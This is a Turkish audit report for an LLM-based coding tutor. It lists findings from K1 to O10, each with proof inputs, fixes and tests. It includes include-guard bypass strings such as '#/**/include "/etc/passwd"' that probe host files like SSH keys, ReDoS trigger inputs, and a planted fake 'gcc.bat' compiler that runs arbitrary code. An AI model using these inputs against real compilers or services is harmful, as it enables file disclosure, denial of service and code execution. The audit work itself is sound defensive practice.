@@ -1,0 +1,976 @@
+# Bulgular ve Düzeltilecekler — Tam Tarama (2026-10-12)
+
+**Kapsam:** Tüm repo (`src/`, `web/`, `tests/`, `data/`, `prompts/`, `schemas/`, CI, paketleme, belgeler).
+**Yöntem:** Dört bağımsız `kod-denetci` ajanı paralel tarama yaptı (güvenlik/API/web, LLM hattı,
+statik analiz, masaüstü/CLI/dağıtım). Kritik iddialar ayrıca elle yeniden doğrulandı. Repoda
+hiçbir dosya değiştirilmedi.
+**Başlangıç durumu (main = `d42515c`):** `ruff` temiz, `ruff format` temiz (423 dosya),
+`mypy --strict` temiz (198 dosya), `pytest -m "not live"` → **3127 geçti, 14 atlandı, 6 seçilmedi**
+(143 sn).
+
+**Doğrulama etiketleri:**
+- ✅ **Elle doğrulandı**: ana oturumda komutla yeniden üretildi.
+- 🔬 **Ajan doğruladı**: ajan küçük bir betik ya da FakeProvider ile çalıştırarak gösterdi.
+- 📖 **Kod okumasıyla**: kod incelenerek tespit edildi, çalıştırılmadı.
+- ❓ **Doğrulanmadı**: olası; kontrol edilmeli.
+
+**Önem:** 🔴 Kritik · 🟠 Yüksek · 🟡 Orta · 🟢 Düşük
+
+---
+
+## İçindekiler
+
+1. [Özet tablo](#1-özet-tablo)
+2. [Kritik](#2-kritik)
+3. [Yüksek](#3-yüksek)
+4. [Orta](#4-orta)
+5. [Düşük](#5-düşük)
+6. [Public yayın hazırlığı](#6-public-yayın-hazırlığı)
+7. [Sağlam bulunanlar](#7-sağlam-bulunanlar)
+8. [Eksik testler](#8-eksik-testler)
+9. [Eklenmesi önerilen özellikler](#9-eklenmesi-önerilen-özellikler)
+10. [Faz planı (A-J)](#10-faz-planı-a-j)
+11. [Tarama sırasındaki yan etkiler](#11-tarama-sırasındaki-yan-etkiler)
+
+---
+
+## 1. Özet tablo
+
+| Kimlik | Önem | Alan | Başlık | Doğrulama | 18 Ekim öncesi? |
+|---|---|---|---|---|---|
+| K1 | 🔴 | Tier 1 güvenlik | Include koruması `#/**/include` ile atlatılıyor | ✅ | Evet |
+| K2 | 🔴 | API / ingest | Dil tespitinde kübik ReDoS + 6 karesel desen, olay döngüsünü kilitliyor | ✅ | Evet |
+| Y1 | 🟠 | Tier 1 güvenlik | Windows'ta çalışma dizinindeki sahte derleyici seçilebiliyor | 🔬 (koşullu) | Evet |
+| Y2 | 🟠 | Gizlilik | Repoda referans çözüm olabilir (`unity03_reference.cs`) | ❓ | Evet |
+| Y3 | 🟠 | Pipeline | Onarım döngüsü doğrulanmış bulguları atıyor | 🔬 | Evet |
+| Y4 | 🟠 | Pipeline | Geçiş B hatası Geçiş A'yı da atıyor | 📖 | Evet |
+| Y5 | 🟠 | Önbellek | Fallback raporu birincil sağlayıcının anahtarıyla saklanıyor | 📖 | Evet |
+| Y6 | 🟠 | İpucu merdiveni | Masaüstü kavram adını her seviyede gösteriyor; API/JSON da veriyor | ✅ | Evet |
+| Y7 | 🟠 | Masaüstü | toml yazıcısı kullanıcı ayarını siliyor, atomik değil | 🔬 | Evet |
+| Y8 | 🟠 | Masaüstü (exe) | toml yokken yapılandırma konumu ve yeniden yükleme yanlış | 📖 | Evet |
+| Y9 | 🟠 | CLI | Sistem hatası 1 çıkış koduyla dönüyor (bulgu ile karışıyor) | 🔬 | Evet |
+| O1 | 🟡 | Belgeler / web | Faz 62 belgesi yapılmamış web/toplu silmeyi yapıldı diyor | ✅ | Evet (belge) |
+| O2 | 🟡 | Pipeline | `single_pass` doğrulanmamış bulgudan soru üretiyor | 🔬 | Evet |
+| O3 | 🟡 | Önbellek | Anahtarda `tier1`, `rules.disabled`, prompt ayarları yok | 📖 | Önerilir |
+| O4 | 🟡 | Önbellek | Önbellekten dönen raporda eski `cost_est` | 🔬 | Önerilir |
+| O5 | 🟡 | Sağlayıcılar | CLI ajan çıktısı 64 KB'de kesiliyor, sonuç olayı kayboluyor | ❓ | Sonra |
+| O6 | 🟡 | Sağlayıcılar | Kalıcı CLI hataları 3 kez yeniden deneniyor | 📖 | Sonra |
+| O7 | 🟡 | Config | BOM'lu toml uygulamayı tamamen durduruyor | ✅ | Evet |
+| O8 | 🟡 | Config | `.env` hiç okunmuyor; `.env.example` eski | ✅ | Evet |
+| O9 | 🟡 | Paketleme | Wheel'e varsayılan toml girmiyor | 📖 | Önerilir |
+| O10 | 🟡 | Masaüstü | Bozuk veritabanında exe hiç açılmıyor | 📖 | Önerilir |
+| O11 | 🟡 | CLI | Kök `--help` Türkçe karakterleri bozuk basıyor | 🔬 | Evet |
+| O12 | 🟡 | CLI | `toolchain` ve `eval compare` traceback veriyor | 🔬 | Önerilir |
+| O13 | 🟡 | Masaüstü | Dışa aktarma hatası sessiz | 📖 | Sonra |
+| O14 | 🟡 | Gizlilik | "Geçmişi temizle" sonrası kod veritabanı dosyasında kalıyor | 📖 | Önerilir |
+| O15 | 🟡 | Web güvenlik | Monaco hover güvenilmeyen markdown işliyor | 📖 | Önerilir |
+| O16 | 🟡 | Web / API | CSP ve güvenlik başlıkları yok | 📖 | Sonra |
+| O17 | 🟡 | CI | Etiketle release yok, `permissions` yok, duman testi yok | 📖 | Evet (release) |
+| O18 | 🟡 | Sürüm | v0.1.0 main'in gerisinde; sürüm iki yerde | ✅ | Evet |
+| D1-D20 | 🟢 | Çeşitli | Bkz. §5 | — | Sonra |
+
+---
+
+## 2. Kritik
+
+### K1 — Include koruması yorumla atlatılıyor 🔴 ✅
+
+- **Dosya:** `src/codementor/validation/include_guard.py:109` (`_check_line`, `_KEYWORD.finditer(raw)`)
+- **Ne yanlış:** `_KEYWORD = (?:#|%:)[ \t\f\v]*(include|import|embed|pragma…)` yönergeyi yalnız
+  **ham** metinde arıyor ve `#` ile anahtar sözcük arasında yalnız boşluk kabul ediyor. C/C++
+  çeviri aşaması 3'te yorumlar tek boşluğa dönüştüğü için `#/**/include "yol"` geçerli bir
+  yönergedir; koruma onu görmüyor.
+- **Elle doğrulama:**
+  ```
+  '#include "/etc/passwd"'        → reddedildi (doğru)
+  '#/**/include "/etc/passwd"'    → TEMİZ (yanlış)
+  '%:/**/include <x>'             → TEMİZ (yanlış)
+  '#/*\n*/include "/etc/x"'       → TEMİZ (yanlış)
+  ```
+- **Uçtan uca (ajan, zig clang ile):** `run_tier1` derleyiciyi çağırdı; derleyici mutlak yoldaki
+  dosyayı **okudu**.
+- **Etki:**
+  - ADR-0009 / mimari §12 "derleyici host dosya sistemine erişmez" garantisi delinmiş.
+  - **Dosya varlığı kahini:** var olan dosya → `tool_error` ("beklenmedik çıktı"); olmayan dosya →
+    `warning` "başlık bulunamadı; {yol}". Öğrenci sunucuda herhangi bir yolun var olup olmadığını
+    öğrenebiliyor (`~/.ssh/id_rsa`, `C:/Windows/win.ini`…).
+  - **Hafifletici:** `diagnostics.py:23` yalnız `<stdin>:` satırlarını aldığı için dosya
+    **içeriği** kullanıcıya dönmüyor.
+- **Kök neden:** `mask_non_code('#/**/include ...')` → `'#    include ...'` maskede eşleşiyor,
+  ama kod `_KEYWORD`'ü yalnız `raw` üzerinde çalıştırıyor.
+- **Düzeltme:**
+  1. Anahtar sözcük taramasını **maskelenmiş** satırda da yap. Maskede yönerge bulunup hamda
+     bulunmuyorsa fail-closed reddet (maskede hedef boşluğa döndüğü için `_unsafe_path` "boş yol"
+     verir ve red zaten doğal sonuç olur).
+  2. Satırlar arası yorum (`#/*\n*/include`) için maskeleme dosya düzeyinde yapılmalı, satır satır
+     değil.
+- **Testler:** `tests/unit/test_include_guard.py` REJECTED kümesine `#/**/include "…"`,
+  `%:/**/include <…>`, `#/*\n*/include "…"`, `# /* a */ include`, `#/**//**/include` ekle.
+  `compiler` işaretli uçtan uca bir regresyon testi: yönerge Tier 1'e ulaşmadan reddedilmeli.
+
+### K2 — Dil tespitinde ReDoS 🔴 ✅
+
+- **Dosya:** `src/codementor/ingest/detect.py:133`
+  ```python
+  r"^\s*-{0,2}[a-z][a-z-]*\s*:\s*[^;{}()=]*[^;{}]*;\s*$"
+  ```
+- **Ne yanlış:** `\s*`, `[^;{}()=]*` ve `[^;{}]*` aynı karakterleri (boşluk) yakalayabiliyor;
+  sonda `;` yoksa geri izleme kübik büyüyor. Ayrıca `[^;{}]` `\n`'yi de yuttuğu için `re.M`
+  altında desen satır sınırını aşıyor (ayrı bir doğruluk hatası).
+- **Elle doğrulama** (`normalize("a:" + " " * N)`, dil verilmeden):
+
+  | N | Süre |
+  |---|---|
+  | 500 | 0,06 sn |
+  | 1000 | 0,41 sn |
+  | 2000 | 3,29 sn |
+  | 4000 (ajan) | 25,6 sn |
+  | 40 000 (ajan) | 300 sn'de bitmedi; tahmin saatler |
+
+- **Etki:**
+  - Tespit yalnız `language` verilmediğinde çalışıyor; API'de bu alan isteğe bağlı.
+  - `Orchestrator._ingest` (`pipeline/orchestrator.py:122`, `:222`) olay döngüsünde **senkron**
+    çağrılıyor → tüm uvicorn süreci donuyor (`/health` dahil), `analysis_timeout_s` devreye
+    giremiyor, eşzamanlılık yuvası tutulu kalıyor.
+  - Gövde sınırı, Host denetimi ve API anahtarı engellemiyor (~40 KB geçerli bir gövde yetiyor).
+  - CLI ve masaüstünde zararlı bir dosya açmak uygulamayı donduruyor.
+- **Düzeltme:**
+  1. Deseni değiştir (ajan denedi: 40 KB'de 0,2 ms; `color: red;` ve `--x: #fff;` hâlâ
+     eşleşiyor):
+     ```python
+     r"^[ \t]*-{0,2}[a-z][a-z-]*[ \t]*:[^;{}\n]*;[ \t]*$"
+     ```
+  2. `_ingest`'i `asyncio.to_thread` içine al ve süre sınırına dahil et.
+  3. `detect.py`'deki **tüm** sinyal desenlerini, ayrıca `analysis/` ve `rules/` içinde kullanıcı
+     koduna uygulanan regex'leri aynı gözle tara (ajan bunları taramadı).
+
+**Ek ölçüm (2026-10-12, ana oturum, elle) — aynı dosyada karesel desenler:**
+Çok satırlı modda (`re.M`) `^\s*` ile başlayan desenlerde `\s` satır sonunu da yakalıyor; motor her
+satır başından yeniden tarıyor ve süre karesel büyüyor. Girdi `" \n" * N` (boşluk + satır sonu):
+
+| Desen (`detect.py`) | 20 KB | 40 KB |
+|---|---|---|
+| `^\s*[\w.#:*…]+\{\s*$` (CSS "seçici {", satır 132) | 1,59 sn | 6,44 sn |
+| `^\s*(?:if\|elif\|for…)[^;{}]*:…` (Python blok başlığı, satır 108) | 1,09 sn | 5,24 sn |
+| `^\s*(?:from…import\|import…)(?!.*;\s*$)` (Python import, satır 106) | 0,46 sn | 1,86 sn |
+| `^\s*def\s+\w+…` (Python def, satır 105) | 0,19 sn | 0,73 sn |
+| `^\s*elif` (satır 115) | 0,20 sn | 0,75 sn |
+| `^\s*<!DOCTYPE\s+html` (satır 120) | 0,19 sn | 0,77 sn |
+
+Hepsi tek analizde art arda çalıştığı için 40 KB'lik bu girdide toplam **~16 sn** olay döngüsü
+kilidi (CSS özellik deseninin kübik saatlerine ek olarak).
+`_LANGUAGE_SIGNALS` içindeki `^\s*(?:public|private|protected)\s*:` ve `^\s*using …` desenleri
+de aynı yapıda (maskelenmiş metinde çalışıyor; ayrıca ölçülmeli).
+
+- **Ek düzeltme:** satır başı boşluğu için `^\s*` yerine `^[ \t]*`; satır içinde kalması gereken
+  karakter sınıflarına `\n` ekle (`[^;{}]` → `[^;{}\n]`). `_s()` yardımcısına `re.M` desenlerinde
+  `^\s*` kullanımını reddeden bir doğrulama (ya da testte tüm desenleri tarayan bir denetim).
+- **Aynı yapıda, taranacak diğer desenler:** `analysis/_recursion.py:21` (`^\s*…\s*$`, IGNORECASE),
+  `verify/lines.py:20`, `verify/proof.py:50`. Bunlar kısa metinlere (ifade, LLM satırı)
+  uygulandığı için büyük olasılıkla zararsız; girdi uzunlukları doğrulanmalı.
+- **Testler:** her sinyal deseni için en kötü durum girdileri (uzun boşluk, `a:` + boşluk,
+  tekrar eden `-`, `:` dizileri) ile `perf_counter` < 50 ms bütçeli test; hypothesis ile rastgele
+  girdi üretip süre bütçesi.
+
+---
+
+## 3. Yüksek
+
+### Y1 — Windows'ta çalışma dizinindeki sahte derleyici 🟠 🔬 (koşullu)
+
+- **Dosya:** `src/codementor/validation/toolchain.py:51` (`_which` → `shutil.which(name, path=PATH)`)
+- **Ne yanlış:** `run_process` (`runner.py:237`) çıplak/göreli `argv[0]`'ı reddediyor, ama keşif
+  aşamasında `shutil.which` Windows'ta `NoDefaultCurrentDirectoryInExePath` ayarlı değilse
+  çalışma dizinini PATH'in başına ekliyor. Bulunan yol `resolve()` ile mutlak yapıldığı için
+  runner'ın savunması da aşılıyor.
+- **Senaryo (ajan):** çalışma dizininde `gcc.bat` varken, `NoDefaultCurrentDirectoryInExePath`
+  kaldırılmış kabukta `get_toolchain(...).c.command` bu dosyayı seçti; çalıştırınca
+  `stdout='pwned'`. `codementor analyze` kötü niyetli dosya içeren bir dizinden çalıştırılırsa
+  keyfi kod yürütülür. (Ajanın varsayılan ortamında değişken ayarlı olduğu için ilk deneme
+  `None` döndü; istismar ortama bağlı.)
+- **Neden `shutil.which(path=...)` yetmiyor:** Python 3.12'de Windows'ta `path` verilse bile
+  `NeedCurrentDirectoryForExePathW` true dönerse çalışma dizini başa ekleniyor.
+- **Düzeltme:** projede bunun güvenli çözümü **zaten var**: `providers/_cli_common.py`
+  `_candidates()` yalnız PATH'teki **mutlak** dizinleri `PATHEXT` ile geziyor, çalışma dizinini hiç
+  denemiyor (Claude/Codex/agy CLI'ları için yazılmış). Bu mantık ortak bir yardımcıya çıkarılıp
+  (ör. `validation/runner.py`'de `find_on_path(name, search_path)`) `toolchain._which` ve
+  `_candidates` aynı fonksiyonu kullanmalı. `toolchain.py`'de `_which`'in üç çağrısı var
+  (satır 69 gcc/clang, 164 zig, 175 dotnet).
+- **Test:** geçici dizine sahte `gcc.bat`/`gcc` koy, `chdir` et, keşfin onu seçmediğini doğrula.
+
+### Y2 — Repoda referans çözüm olabilir 🟠 ❓
+
+- **Dosya:** `tests/fixtures/llm_responses/unity03_reference.cs`
+- **Ne yanlış:** Golden `unity-03` ("EnemyRadar") için tam bir çözüm git'te izleniyor. Repo public
+  olunca bu sorunun çözümü açılır.
+- **Doğrulanmadı:** `private/` erişimi izinle kapalı olduğu için bankadaki referans çözümle aynı mı
+  bilinmiyor. **Kullanıcı kontrol etmeli.**
+- **Düzeltme:** aynıysa ya da çok benziyorsa fixture'ı bankada olmayan bir soruya ait yapay bir
+  çözümle değiştir. Sonra golden'ları yeniden üret. Git geçmişinde de durduğu için gerekirse ilgili
+  soruyu bankada değiştirmek daha kolay olabilir.
+
+### Y3 — Onarım döngüsü doğrulanmış bulguları atıyor 🟠 🔬
+
+- **Dosya:** `src/codementor/pipeline/passes.py:122-147`
+- **Ne yanlış:** İlk yanıt şemaya uyuyor ve bulgular kanıtla doğrulanıyor. Ama karmaşıklık statik
+  ipucuyla gerekçesiz çelişirse (`unjustified_conflict`) onarım isteniyor. Onarım yanıtı bozuk
+  gelirse ya da çelişki sürerse `PassA(None, None)` dönüyor; rapor tamamen `degraded` oluyor.
+  Oysa `_complexity_result` (`verify/analysis.py:117`) bu durumda zaten yalnız karmaşıklığı
+  `None` yapmaya hazır.
+- **Probe:** `analysis_reply(time="O(n^3)")` + `FakeReply(raw="bozuk")` → `degraded=True`;
+  31. satırdaki doğrulanmış LLM bulgusu kayboldu.
+- **Düzeltme:** son geçerli `parsed` + `verification` saklansın. Onarım başarısızsa ve kalan hata
+  yalnız karmaşıklıksa: bulgular korunur, `complexity=None`, uyarı eklenir. Şema hatasıyla biten
+  onarımda en son geçerli `parsed` kullanılır.
+- **Test:** ilk yanıt geçerli + çelişkili karmaşıklık + bozuk onarım → bulgular raporda,
+  `complexity` boş, `degraded=False`, uyarı var.
+
+### Y4 — Geçiş B hatası Geçiş A'yı da atıyor 🟠 📖
+
+- **Dosya:** `src/codementor/pipeline/orchestrator.py:351-355` (`run_llm_passes`)
+- **Ne yanlış:** her `ProviderError`, `PromptBudgetError` ve `PromptConfigError` tüm sonucu
+  `LLMOutcome(None, None)` yapıyor. Geçiş B'de 429, ağ hatası ya da `build_socratic_messages`
+  bütçe hatası doğrulanmış bulguları da siliyor; token boşa harcanıyor. PROGRESS Sonraya'daki
+  "süre Geçiş B sırasında dolarsa…" maddesinin genel hâli.
+- **Düzeltme:** Geçiş B'yi ayrı `try` bloğuna al; hata olursa
+  `LLMOutcome(verification, None, [uyarı])` dön. Öğrenci şablon sorular alır, bulgular korunur.
+  Zaman aşımı yolu da aynı kısmi sonucu döndürsün.
+- **Test:** Geçiş A başarılı, Geçiş B `ProviderUnavailableError` / `PromptBudgetError` /
+  zaman aşımı → bulgular raporda, Sokratik kısım şablon, uyarı var.
+
+### Y5 — Fallback raporu birincil sağlayıcının önbellek anahtarıyla saklanıyor 🟠 📖
+
+- **Dosya:** `orchestrator.py:162`, `_cache_key` (`orchestrator.py:251-266`),
+  `storage/cache.py:107-147`
+- **Ne yanlış:** anahtar `run.provider_name` + birincil sağlayıcının modeliyle kuruluyor. Yanıtı
+  fallback (ör. yerel Ollama 7B) vermiş olabilir; rapor `degraded` olmadığı için önbelleğe giriyor.
+- **Senaryo:** `claude_cli` anlık düştü, Ollama yanıt verdi. Claude düzelse de aynı kod için
+  Ollama'nın raporu dönüyor.
+- **Benzerleri:** Geçiş B'nin şablona düştüğü raporlar ve `VERIFY_FAILED` uyarılı raporlar da
+  önbelleğe giriyor; kısmi sonuç kalıcılaşıyor.
+- **Düzeltme:** `meta.provider` anahtardaki sağlayıcıdan farklıysa ya da LLM'in bir kısmı başarısız
+  olduysa (fallback uyarısı, Sokratik şablon, doğrulama hatası) kaydı önbelleğe alma
+  (`cache_key=None` ya da `cacheable=False` bayrağı).
+- **Test:** birincil hata + fallback yanıtı → ikinci istek önbellekten dönmez.
+
+### Y6 — İpucu merdiveni: kavram adı her seviyede açık 🟠 ✅
+
+- **Dosyalar:**
+  - `src/codementor/desktop/widgets/socratic_card.py:58` → `result.key_flaw_concept` koşulsuz,
+    kalın başlık olarak basılıyor (elle doğrulandı).
+  - `report/cli_render.py:106` ve `report/markdown.py:80` → yalnız `hint_level >= 3` iken
+    gösteriyor. Arayüzler arasında tutarsızlık var.
+  - `models/report.py:31`, `verify/analysis.py:205-217, 233` → API yanıtı ve web "JSON indir"
+    (`web/src/components/ReportDownload.tsx:31`) seviye 1'de bile alanı veriyor.
+- **Ne yanlış:** prompt `name_concept=False` iken (orta/zor soruda ilk deneme) kavram adını yalnız
+  bu alana yazmasını söylüyor. Bu 80 karakterlik alan çözümü ele verebilir ("unordered_set ile
+  O(1) arama") ve `check_leaks` denetimine girmiyor. Mimari §5.4.3 ihlali.
+- **Düzeltme:** gösterim kuralı tek yerde dursun (`SocraticResult.concept_revealed: bool` ya da
+  seviye < 3'te API'de alanı boş/maskeli döndür). Masaüstü, web, CLI, Markdown aynı bayrağı
+  kullansın. `key_flaw_concept` `check_leaks` hedeflerine eklensin.
+- **Test:** seviye 1 ve 2'de masaüstü kartı, API yanıtı ve JSON indirmesinde kavram yok; seviye
+  3'te var. Sızıntılı kavram adı yakalanıyor.
+
+### Y7 — toml yazıcısı kullanıcı ayarını siliyor 🟠 🔬
+
+- **Dosya:** `src/codementor/desktop/config_writer.py:18-24, 42`
+- **Ne yanlış (ajan scratchpad'de doğruladı):**
+  - `providers = { default="ollama", fallback=["anthropic"] }` (satır içi tablo) → yazım sonrası
+    `[providers]\ndefault = "claude_cli"`; `fallback` **kayboluyor**.
+  - Nokta anahtarlı `providers.fallback = ["x"]` de aynı şekilde kayboluyor.
+  - Yazım `write_text` ile doğrudan, atomik değil; yarıda kesilirse toml bozuluyor
+    (`runtime.save_prefs` ise temp + `os.replace` kullanıyor).
+- **Düzeltme:** mevcut `Table` / `InlineTable` / super-table'ı yerinde güncelle; anahtar yoksa
+  ekle, varsa yalnız değeri değiştir. Temp dosya + `os.replace` ile atomik yaz.
+- **Test:** satır içi tablo, nokta anahtarı, yorumların korunması, BOM'lu dosya, yazım sırasında
+  istisna (eski dosya bozulmamalı).
+
+### Y8 — Exe'de yapılandırma konumu ve yeniden yükleme yanlış 🟠 📖
+
+- **Dosyalar:** `src/codementor/desktop/app.py:443-449, 464`, `desktop/runtime.py:44-74`
+- **Ne yanlış:** exe'nin yanında `codementor.toml` yokken `CONFIG_FILE_ENV` ayarlanmıyor ve
+  çalışma dizini `_MEIPASS` oluyor.
+  - Bağlantılar ekranındaki "Yapılandırma" konumu geçici dizindeki toml'u gösteriyor; kullanıcı
+    "klasörü aç" ile onu düzenlerse onefile exe kapanınca değişiklik siliniyor.
+  - "toml'a yaz" dosyayı exe'nin yanına oluşturuyor, ama `reload_config` paketteki toml'u okumaya
+    devam ediyor; yazılan dosya yeniden başlatmaya kadar yok sayılıyor.
+- **Düzeltme:** `writable_config_file()` kopyalamadan sonra `os.environ[CONFIG_FILE_ENV]`'i
+  ayarlasın; `_locations` aynı yolu göstersin.
+- **Test:** toml'suz exe senaryosu: yaz → yeniden yükle → yeni değer okunuyor; gösterilen konum
+  yazılan dosya.
+
+### Y9 — CLI sistem hatasında 1 dönüyor 🟠 🔬
+
+- **Dosya:** `src/codementor/cli/analyze.py:93, 157-171`
+- **Ne yanlış:** veritabanı açılamazsa ya da `--out` yazılamazsa yakalanmamış traceback çıkıyor ve
+  çıkış kodu **1** oluyor. Mimari §10'da 1 = "yüksek önemli bulgu var". CI kullanan biri sistem
+  hatasını bulgu sanır. Ajan geçersiz `CODEMENTOR_DB_PATH` ile `FileExistsError` + exit=1'i
+  doğruladı. Ayrıca `out.open("w")` (satır 164) kapatılmıyor.
+- **Düzeltme:** `OSError`, `SQLAlchemyError`, `RuntimeError` yakalanıp Türkçe mesaj +
+  `EXIT_SYSTEM_ERROR` (3). Dosyayı `with` ile aç.
+- **Test:** geçersiz DB yolu, yazılamayan `--out` → çıkış 3, traceback yok.
+
+---
+
+## 4. Orta
+
+### O1 — Faz 62 belgesi gerçeği yansıtmıyor 🟡 ✅
+
+- **Dosya:** `docs/GUNCELLEMELER.md` Faz 62 bölümü.
+- **Ne yanlış:** "API: `DELETE /v1/analyses/{id}` **ve toplu silme**; **web arayüzünde aynı
+  düğmeler**" maddesi [x] işaretli. Kodda:
+  - Yalnız tekil `DELETE /v1/analyses/{id}` var (`api/routes.py:216`).
+  - Toplu silme ucu yok.
+  - Analizleri listeleyen `GET /v1/analyses` ucu yok.
+  - Web'de geçmiş ekranı da silme düğmesi de yok (`web/src/api/client.ts` silme çağırmıyor).
+  - PROGRESS "Faz 62 — Notlar" doğru (yalnız tekil silme), ama GUNCELLEMELER yanlış.
+- **Düzeltme:** ya belgeyi düzelt (madde açık kalsın) ya da web geçmiş/silme özelliğini yap
+  (§9 Web).
+
+### O2 — `single_pass` doğrulanmamış bulgudan soru üretiyor 🟡 🔬
+
+- **Dosya:** `src/codementor/pipeline/passes.py:293-307`
+- **Ne yanlış:** tek geçişin soruları (`first`) yalnız doğrulama geçişi bulgu düşürürse
+  sıfırlanıyor. K5 satır/kanıt kontrolünün attığı bulgular ve `verify_findings=false` bunu
+  tetiklemiyor.
+- **Probe:** bulgunun kanıtı `hayali_satir();` → bulgu raporda yok, ama soru "hayali_satir çağrısı
+  neden tehlikeli olabilir?" olarak geldi. Mimari §5.4.2 "doğrulanmamış bulgular soruya
+  dönüşmez" ile çelişiyor.
+- **Düzeltme:** `len(verified) < len(output.additional_findings)` olduğunda da `first = None`;
+  ayrı Geçiş B'ye gidilsin.
+- **Test:** `single_pass` + kanıtsız bulgu → ikinci çağrı yapılıyor, sorular yalnız doğrulanmış
+  bulgulara dayanıyor.
+
+### O3 — Önbellek anahtarı çıktıyı etkileyen ayarları içermiyor 🟡 📖
+
+- **Dosya:** `orchestrator.py:271-274` (`_pipeline_signature`)
+- **Anahtarda olmayanlar:**
+  - `rules.disabled`, `rules.max_findings`
+  - `prompts.include_facts`, `numbered_code`, `max_fewshots`, `max_checklist_items`
+  - `verify.*` eşikleri, `pipeline.max_repair_attempts`
+  - **İsteğin `options.tier1` değeri ve derleyicinin kurulu olup olmadığı / sürümü**
+- **Senaryo:** Tier 1 kapalıyken (ya da derleyici yokken) yapılan analiz önbelleğe giriyor; sonra
+  derleyici kuruluyor, aynı kod için derleme denetimi yapılmamış eski rapor dönüyor. Kuralı
+  kapatan kullanıcı o kuralın bulgusunu görmeye devam ediyor.
+- **Eval'i etkilemiyor:** eval her zaman `use_cache=False`.
+- **İlgili bilinenler:** PROGRESS Sonraya (soru içeriği anahtarda yok; derleyici sürümü imzada yok).
+- **Düzeltme:** imza = `Settings`'in çıktıyı etkileyen alt kümesinin hash'i + Tier 1 etkin mi +
+  derleyici kimliği/sürümü + soru içeriği özeti.
+- **Test:** `options.tier1`, `rules.disabled` ya da prompt bayrağı değişince önbellek ıskalanıyor.
+
+### O4 — Önbellekten dönen raporda eski maliyet 🟡 🔬
+
+- **Dosyalar:** `pipeline/assemble.py:86-101` (`from_cache`), `orchestrator.py:168-169`
+- **Ne yanlış:** `from_cache` token sayılarını sıfırlıyor ama `cost_est`'i önceki koşudan
+  kopyalıyor.
+- **Probe:** ilk koşu `cost_est=0.002385`; önbellek dönüşü `cache_hit=True`, `tokens=0`,
+  `cost_est=0.002385`. Masaüstü/web harcanmamış parayı gösteriyor.
+- **Düzeltme:** `from_cache` içinde `cost_est=None`, `usage_estimated=False`.
+- **Test:** önbellek dönüşünde `cost_est is None`.
+
+### O5 — CLI ajan çıktısı 64 KB'de kesiliyor 🟡 ❓
+
+- **Dosyalar:** `validation/runner.py:37` (`OUTPUT_LIMIT`), `providers/cli_agent.py:257-260`,
+  `providers/codex_cli.py:205-209`
+- **Ne yanlış:** agy `stream-json` ve codex `--json` her parça/olay için ayrı satır yazıyor; sonuç
+  olayı en sonda. Okuyucu ilk 64 KB'yi tutuyor. Uzun yanıtta `result_event` `None` olur, hata
+  "çıktı boyutu sınırı aşıldı" diye döner, `first_response_text` geri dönüşüne hiç ulaşılmaz.
+  Canlı doğrulanmadı.
+- **Düzeltme:** `ProcessLimits.output_limit` alanı; CLI ajanları için config'den (ör. 2 MB). Ya da
+  akış biçiminde baş yerine son N bayt tutulsun.
+- **Test:** 64 KB'yi aşan sahte akış çıktısı → sonuç olayı okunuyor.
+
+### O6 — Kalıcı CLI hataları yeniden deneniyor 🟡 📖
+
+- **Dosya:** `providers/cli_agent.py:313-316, 345`
+- **Ne yanlış:** agy'nin "yanıt boş; oturum açık mı?" hatası (MCP takılması dahil) ve Claude'un
+  bilinmeyen `subtype` hataları (ör. `error_max_structured_output_retries`)
+  `ProviderUnavailableError` olduğu için yeniden denenebilir sayılıyor. Kalıcı bir oturum veya
+  yapılandırma hatası için CLI 3 kez açılıyor (agy'de her biri ~20 sn).
+- **Düzeltme:** yeniden denenmeyen bir alt sınıf (`CliTimeoutError` gibi), ör.
+  `CliPermanentError`.
+- **Test:** boş yanıt / bilinmeyen subtype → tek çağrı.
+
+### O7 — BOM'lu toml uygulamayı durduruyor 🟡 ✅
+
+- **Dosya:** `src/codementor/config.py:301` (`_RelativeTomlSource`)
+- **Ne yanlış:** `tomllib` BOM'u reddediyor (elle doğrulandı: `TOMLDecodeError`). Not Defteri'nde
+  "UTF-8 BOM" ile kaydedilen toml masaüstünü ve CLI'ı tamamen durduruyor; `config_writer` ise
+  `EmptyKeyError` veriyor.
+- **Düzeltme:** okumada `removeprefix("\ufeff")`; `config_writer` de aynı şekilde okuyup BOM'suz
+  yazsın.
+- **Test:** BOM'lu toml okunuyor ve yazılıyor.
+
+### O8 — `.env` okunmuyor, `.env.example` eski 🟡 ✅
+
+- **Dosyalar:** `.env.example`, `src/codementor/config.py:298` (`settings_customise_sources`)
+- **Ne yanlış:**
+  - `dotenv_settings` döndürülmüyor, `env_file` tanımlı değil → `.env` **hiç yüklenmiyor**. Anahtarı
+    `.env`'ye yazan kullanıcı "neden çalışmıyor" diye kalır.
+  - `OPENAI_API_KEY`, `DEEPSEEK_API_KEY` Faz 37'de kaldırılan sağlayıcılara ait; `GEMINI_API_KEY`
+    ve `CODEMENTOR_API_KEY` eksik.
+- **Düzeltme:** iki seçenek: (a) `.env` desteği ekle (`env_file=".env"`, toml'un dizinine göre); (b)
+  dosya başına "ortam değişkeni olarak ayarlayın; .env otomatik yüklenmez" yaz. Her durumda değişken
+  listesini güncelle.
+
+### O9 — pip ile kurulumda varsayılan toml yok 🟡 📖
+
+- **Dosya:** `pyproject.toml:63-66` (`force-include`)
+- **Ne yanlış:** wheel'e `codementor.toml` girmiyor. `pip install` / `uv tool install` kullanıcısında:
+  - varsayılan sağlayıcı `ollama` oluyor (repoda `claude_cli`);
+  - `zig.sources` boş, `toolchain install zig` "tanımlı değil" hatası veriyor;
+  - `codementor-desktop` çalışma dizinini `site-packages/codementor/_resources`'a alıyor
+    (`runtime.py:74`); "toml'a yaz" **paket dizinine** yazıyor (`runtime.py:60`).
+- **Düzeltme:** varsayılan toml'u `_resources`'a ekle. Frozen olmayan masaüstünde yazma ve okuma
+  için `~/.codementor/codementor.toml` kullan.
+- **Test:** wheel'i geçici venv'e kur, `codementor providers` varsayılanı `claude_cli`.
+
+### O10 — Bozuk veritabanında exe açılmıyor 🟡 📖
+
+- **Dosya:** `src/codementor/desktop/launch.py:32-33`
+- **Ne yanlış:** `state.database()` korumasız. Bozuk ya da kilitli `codementor.db` ("file is not a
+  database") olunca pencereli exe hiç açılmıyor; hata yalnız `desktop.log`'a gidiyor. Tk'de
+  `report_callback_exception` tanımlı değil (beklenmeyen istisnalar sessiz).
+- **Düzeltme:** `messagebox` ile Türkçe hata + "veritabanını yedekleyip sıfırla" seçeneği;
+  `report_callback_exception` log + kullanıcıya bildirim.
